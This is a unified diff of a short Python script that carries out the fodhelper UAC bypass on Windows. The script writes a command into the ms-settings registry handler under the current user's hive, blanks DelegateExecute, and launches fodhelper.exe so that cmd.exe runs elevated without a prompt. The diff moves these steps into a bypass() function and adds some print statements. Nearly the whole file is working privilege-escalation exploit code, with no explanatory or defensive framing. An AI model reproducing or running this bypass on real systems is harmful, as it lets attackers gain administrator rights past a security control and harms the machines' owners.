@@ -1,13 +1,8 @@
 import winreg, os
 
 def main():
-	Command = r"C:\Windows\System32\cmd.exe"
-	
-	set_reg("DelegateExecute", "")
-	set_reg("(default)", Command)
-	
-	# Run  C:\Windows\System32\fodhelper.exe
-	os.system(r"C:\Windows\System32\fodhelper.exe")
+	bypass(r"C:\Windows\System32\cmd.exe")
+	print("Done.")
 
 def set_reg(name, value):
 	REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
@@ -19,7 +14,14 @@ def set_reg(name, value):
         winreg.CloseKey(registry_key)
         return True
     except WindowsError:
+    	print("Error")
         return False
+
+def bypass(cmd):
+	set_reg("DelegateExecute", "")
+	set_reg("(default)", cmd)
+	os.system(r"C:\Windows\System32\fodhelper.exe")
+
 
 if __name__ == "__main__":
     main()
